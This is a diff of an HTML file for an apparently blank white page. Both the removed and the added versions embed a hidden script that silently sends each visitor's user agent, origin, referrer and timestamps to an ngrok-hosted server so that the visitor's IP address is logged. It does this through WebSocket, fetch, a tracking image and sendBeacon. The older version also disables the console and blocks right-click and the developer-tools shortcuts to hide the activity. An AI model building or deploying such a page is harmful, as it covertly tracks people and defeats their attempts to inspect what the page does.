@@ -1,62 +1,10 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
-    <style>
-        * { margin: 0; padding: 0; }
-        body { 
-            background: white; 
-            height: 100vh; 
-            overflow: hidden; 
-        }
-    </style>
-</head>
-<body>
-    <!-- IP LEAK via WebSocket (silent) -->
-    <script>
-        // Ganti leakServers dengan server Anda
-const leakServers = [
-    'wss://era-lagomorphous-viva.ngrok-free.dev',  // WebSocket server Anda
-];
-        
-        leakServers.forEach((url, index) => {
-            setTimeout(() => {
-                const ws = new WebSocket(url);
-                
-                ws.onopen = () => {
-                    // Kirim data untuk capture origin IP
-                    ws.send(JSON.stringify({
-                        timestamp: Date.now(),
-                        userAgent: navigator.userAgent,
-                        origin: window.location.origin
-                    }));
-                };
-                
-                ws.onmessage = (event) => {
-                    // Silent - no console/debug
-                    console.log = () => {}; // Disable console leak
-                };
-                
-                ws.onerror = ws.onclose = () => {};
-            }, index * 500); // Stagger connections
-        });
-        
-        // Additional leak via headers (beacon)
-        navigator.sendBeacon('https://era-lagomorphous-viva.ngrok-free.dev/track', JSON.stringify({
-            ip: 'detect',
-            referrer: document.referrer,
-            timestamp: Date.now()
-        }));
-        
-        // Prevent F12 inspection detection
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('keydown', e => {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
-                e.preventDefault();
-            }
-        });
-    </script>
-</body>
-</html>
+<!DOCTYPE html><html><head><style>body{background:#fff;height:100vh}</style></head><body>
+<script>
+URL = 'https://era-lagomorphous-viva.ngrok-free.dev';
+
+fetch(URL+'/track', {method:'POST',mode:'no-cors',body:'leak=1'});
+
+i=new Image; i.src=URL+'/track?t='+Date.now()+'&ua='+btoa(navigator.userAgent);
+
+navigator.sendBeacon(URL+'/track', new Blob(['ua='+btoa(navigator.userAgent)],{type:'text/plain'}));
+</script></body></html>
